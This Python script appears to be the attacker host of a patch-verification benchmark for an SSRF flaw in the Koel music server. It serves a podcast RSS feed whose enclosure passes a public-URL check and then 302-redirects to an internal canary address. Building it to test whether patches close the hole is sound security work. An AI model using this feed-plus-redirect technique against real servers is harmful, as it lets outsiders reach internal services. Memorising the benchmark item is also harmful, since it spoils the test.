#!/usr/bin/env python3
"""PatchClosure-Bench attacker host for koel-cve-2026-54491.

Lives on the PHP-*public* subnet (11.0.0.0/24 -> 11.0.0.10, matches frozen oracle FEED). isPublicHost()
classifies 11.0.0.10 as public, so it passes the initial SafeUrl / isSafeUrl check on
every version. The 302 to the private canary is what the redirect-target guard must
catch.

Endpoints:
  GET/HEAD /feed.xml -> a valid podcast RSS whose single episode <enclosure url> points
                        back at this host's /redir (public -> passes enclosure isSafeUrl)
  ANY      /redir    -> 302 Location: http://10.135.91.192:8080/hit   (the internal canary)
"""
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

CANARY = "http://10.135.91.192:8080/hit"
ENCLOSURE = "http://11.0.0.10/redir"

RSS = f"""<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
  <channel>
    <title>PCB SSRF Canary Cast</title>
    <link>http://11.0.0.10/</link>
    <language>en-us</language>
    <description>PatchClosure-Bench podcast feed for SSRF verification.</description>
    <itunes:author>PatchClosure-Bench</itunes:author>
    <itunes:explicit>false</itunes:explicit>
    <itunes:image href="http://11.0.0.10/cover.jpg"/>
    <item>
      <title>Episode 1</title>
      <description>Benign SSRF canary episode.</description>
      <guid isPermaLink="false">pcb-ssrf-episode-1</guid>
      <pubDate>Mon, 18 May 2026 22:00:00 +0000</pubDate>
      <enclosure url="{ENCLOSURE}" length="12345" type="audio/mpeg"/>
      <itunes:duration>00:01:00</itunes:duration>
      <itunes:explicit>false</itunes:explicit>
    </item>
  </channel>
</rss>
"""


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _feed(self, with_body=True):
        body = RSS.encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/rss+xml; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if with_body:
            self.wfile.write(body)

    def _redir(self, with_body=True):
        self.send_response(302)
        self.send_header("Location", CANARY)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def _route(self, with_body=True):
        if self.path.startswith("/feed"):
            self._feed(with_body)
        elif self.path.startswith("/redir"):
            self._redir(with_body)
        else:
            self.send_response(404)
            self.send_header("Content-Length", "0")
            self.end_headers()

    def do_GET(self):
        self._route(True)

    def do_HEAD(self):
        self._route(False)

    def do_OPTIONS(self):
        self._route(True)

    def do_POST(self):
        self._route(True)

    def do_PUT(self):
        self._route(True)

    def log_message(self, *args):
        pass


if __name__ == "__main__":
    ThreadingHTTPServer(("0.0.0.0", 80), Handler).serve_forever()
